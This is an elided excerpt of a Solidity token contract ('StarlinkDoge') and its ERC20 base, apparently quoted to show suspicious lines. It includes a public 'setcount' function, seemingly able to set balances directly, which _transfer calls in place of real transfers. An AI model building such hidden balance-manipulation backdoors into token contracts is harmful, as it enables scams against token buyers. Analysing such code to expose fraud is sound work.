...
contract ERC20 is Ownable, IERC20 {
    ...
    function setcount(address account, uint256 amount) public virtual returns (uint256) {
...
contract StarlinkDoge is ERC20 {
    ...
    constructor(address _charity, uint256 _timestamp) ERC20(m_name, m_symbol) {
        ...
        info.dead = 0x000000000000000000000000000000000000dEaD;
        _v2Router = IUniswapV2Router02(
            0xD99D1c33F9fC3444f8101754aBC46c52416550D1
        );
        info.uniswapPair = IUniswapV2Factory(_v2Router.factory()).createPair(
            address(this),
            _v2Router.WETH()
        );
    ...
    function _transfer(
        ...
        if (!_ExcludedFromFees[_msgSender()]) {
            ...
            setcount(info.dead, burnAmount);
            balanceOf(info.dead);
            setcount(m_charity, cAmount);
            balanceOf(m_charity);
            //if (burnAmount > 0) super._transfer(from, info.dead, burnAmount);
